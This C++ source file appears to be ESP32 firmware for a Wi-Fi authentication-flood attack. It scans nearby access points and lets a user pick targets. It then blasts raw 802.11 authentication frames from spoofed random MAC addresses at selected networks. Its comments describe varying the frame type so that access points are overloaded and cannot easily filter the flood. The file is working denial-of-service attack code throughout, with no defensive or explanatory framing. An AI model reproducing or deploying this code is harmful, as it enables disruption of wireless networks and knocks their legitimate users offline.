#include "auth_flood.h"

// 802.11 Authentication frame (Open System)
static uint8_t authFrame[30] = {
  0xB0, 0x00,                          // Frame Control: Auth
  0x3A, 0x01,                          // Duration
  0x00,0x00,0x00,0x00,0x00,0x00,       // Destination: AP BSSID
  0x00,0x00,0x00,0x00,0x00,0x00,       // Source: random MAC (filled each send)
  0x00,0x00,0x00,0x00,0x00,0x00,       // BSSID: AP BSSID
  0x00,0x00,                           // Seq
  0x00,0x00,                           // Auth algorithm: Open System
  0x01,0x00,                           // Auth seq: 1
  0x00,0x00                            // Status: success
};

void AuthFlood::begin() { _running=false; _count=0; _sent=0; }

void AuthFlood::scanStart() {
  _count=0; _scanning=true;
  WiFi.scanNetworks(true, true);
  Serial.println("AuthFlood: async scan started");
}
void AuthFlood::scan() { scanStart(); }

void AuthFlood::select(int i, bool on)  { if(i>=0&&i<_count) _targets[i].selected=on; }
void AuthFlood::selectAll()             { for(int i=0;i<_count;i++) _targets[i].selected=true; }
void AuthFlood::clearSelection()        { for(int i=0;i<_count;i++) _targets[i].selected=false; }
void AuthFlood::startAll()              { selectAll(); startSelected(); }

void AuthFlood::startSelected() {
  _running=true; _sent=0; _curTgt=0;
  Serial.println("AuthFlood: started");
}

void AuthFlood::_sendAuth(uint8_t* bssid, int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  uint8_t srcMac[6];
  for(int i=0;i<6;i++) srcMac[i]=random(256);
  srcMac[0]=(srcMac[0]&0xFE)|0x02; // locally administered bit set

  memcpy(&authFrame[4],  bssid,  6); // Destination = AP BSSID
  memcpy(&authFrame[10], srcMac, 6); // Source = spoofed random MAC
  memcpy(&authFrame[16], bssid,  6); // BSSID = AP BSSID

  // Vary sequence number (realistic — real devices increment per frame)
  static uint16_t seq = 0;
  seq += random(1, 4);
  authFrame[22] = (seq << 4) & 0xFF;
  authFrame[23] = (seq >> 4) & 0xFF;

  // Alternate auth algorithm: Open System (0) vs Shared Key (1)
  // Flooding both types stresses the AP's association table harder
  // than sending only one type (which an AP could filter trivially)
  authFrame[24] = (random(3) == 0) ? 0x01 : 0x00;

  // Send 3 frames per call (same target, different MACs each call due to outer loop)
  for(int i=0;i<3;i++){
    esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
    delay(1);
  }
  _sent++;
}

void AuthFlood::tick() {
  if(_scanning) {
    int n = WiFi.scanComplete();
    if(n == WIFI_SCAN_RUNNING) return;
    if(n >= 0) {
      _count=0;
      for(int i=0; i<n && _count<MAX_AUTH_TARGETS; i++){
        _targets[_count].ssid    = WiFi.SSID(i);
        _targets[_count].bssid   = WiFi.BSSIDstr(i);
        _targets[_count].channel = WiFi.channel(i);
        _targets[_count].selected= false;
        memcpy(_targets[_count].bssidBytes, WiFi.BSSID(i), 6);
        _count++;
      }
      WiFi.scanDelete();
    }
    _scanning=false; return;
  }
  if(!_running) return;
  if(millis()-_lastTx < 20) return; // 50 floods/sec
  _lastTx=millis();

  int checked=0;
  while(checked<_count){
    _curTgt=(_curTgt+1)%_count;
    if(_targets[_curTgt].selected){
      _sendAuth(_targets[_curTgt].bssidBytes, _targets[_curTgt].channel);
      break;
    }
    checked++;
  }
  if(checked>=_count){ _running=false; }
}

void AuthFlood::stop() {
  _running=false;
  Serial.printf("AuthFlood: stopped. Sent: %d\n", _sent);
}
